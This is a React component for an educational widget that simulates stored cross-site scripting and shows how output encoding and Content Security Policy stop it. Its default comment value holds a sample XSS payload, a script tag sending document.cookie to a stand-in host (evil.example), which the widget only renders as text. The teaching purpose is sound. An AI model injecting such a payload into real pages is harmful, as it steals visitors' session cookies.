import { useState } from 'react';
import { Switch } from '@/components/ui/primitives';
import { Field, WidgetFrame, inputCls, monoBox } from './WidgetFrame';
import { cn } from '@/lib/utils';

const escapeHtml = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');

/**
 * Shows what a comment would become in the page's HTML with and without output encoding.
 * Nothing is ever executed: the "page" is a text rendering and an explanation.
 */
export default function XssDemo() {
  const [comment, setComment] = useState('Great article! <script>fetch("https://evil.example/steal?c="+document.cookie)</script>');
  const [encode, setEncode] = useState(false);
  const [csp, setCsp] = useState(false);
  const hasScript = /<\s*script|on\w+\s*=|javascript:/i.test(comment);
  const html = encode ? escapeHtml(comment) : comment;
  const runs = hasScript && !encode && !csp;
  return (
    <WidgetFrame title="Stored cross-site scripting (XSS)" badge="Simulation" note="Simulated rendering — scripts are shown as text and never executed. Defences: context-aware output encoding, input validation, Content Security Policy, HttpOnly cookies.">
      <Field label="Comment submitted by a visitor">
        <textarea className={cn(inputCls, 'h-20 py-2 font-mono')} value={comment} onChange={(e) => setComment(e.target.value)} />
      </Field>
      <div className="mt-3 flex flex-wrap gap-4">
        <Switch checked={encode} onChange={setEncode} label="Output encoding (HTML-escape)" />
        <Switch checked={csp} onChange={setCsp} label="Content Security Policy" />
      </div>
      <div className={cn(monoBox, 'mt-3')}>
        <div className="mb-1 font-sans text-[10px] font-semibold uppercase text-muted">HTML the server sends to every visitor</div>
        &lt;div class=&quot;comment&quot;&gt;<span className={cn(runs && 'rounded bg-bad/25 text-bad', encode && 'text-ok')}>{html}</span>&lt;/div&gt;
      </div>
      <div className={cn('mt-3 rounded-lg border px-3 py-2 text-sm', runs ? 'border-bad/40 bg-bad/10' : 'border-ok/40 bg-ok/10')} aria-live="polite">
        {!hasScript && 'No active content — the comment renders as plain text.'}
        {hasScript && encode && 'Encoding turned < and > into &lt; and &gt;. Visitors see the literal text; the browser never treats it as code.'}
        {hasScript && !encode && csp && 'The markup reaches the page, but the Content Security Policy forbids inline scripts and unknown domains, so the browser refuses to run it. Defence in depth — still fix the encoding bug.'}
        {runs && 'Every visitor’s browser would execute this script in the context of the trusted site: it could steal session cookies, act as the user, or rewrite the page. That is stored XSS.'}
      </div>
    </WidgetFrame>
  );
}
